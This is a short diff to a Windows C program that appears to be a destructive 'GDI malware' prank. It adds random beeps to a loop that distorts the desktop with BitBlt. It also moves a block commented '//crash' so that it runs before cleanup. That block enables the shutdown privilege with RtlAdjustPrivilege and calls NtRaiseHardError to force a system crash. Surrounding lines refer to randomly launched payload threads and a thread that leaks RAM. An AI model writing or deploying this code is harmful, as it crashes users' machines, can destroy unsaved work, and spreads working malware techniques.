@@ -175,6 +175,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     fori(100) {
         BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
         BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
+        Beep(rand() % 2000, rand() % 1000);
     }
     
     // SetPixel is slow
@@ -260,7 +261,13 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[r], NULL, 0, NULL);
         Sleep(rand() % 5000);
     }
-    
+
+    //crash
+    BOOLEAN bOld2;
+    ULONG ulResponse;
+    RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
+    NtRaiseHardError(0xDEADDEAD, NULL, NULL, NULL, 6, &ulResponse);
+    FreeLibrary(ntdll);
 
     ReleaseDC(NULL, desk);
     ReleaseDC(NULL, hHDC);
@@ -273,12 +280,5 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     CloseHandle(hAudio);
     TerminateThread(hLeakRAM, 1);
     CloseHandle(hLeakRAM);
-
-    //crash
-    BOOLEAN bOld2;
-    ULONG ulResponse;
-    RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
-    NtRaiseHardError(0xDEADDEAD, NULL, NULL, NULL, 6, &ulResponse);
-    FreeLibrary(ntdll);
     return 0;
 }   
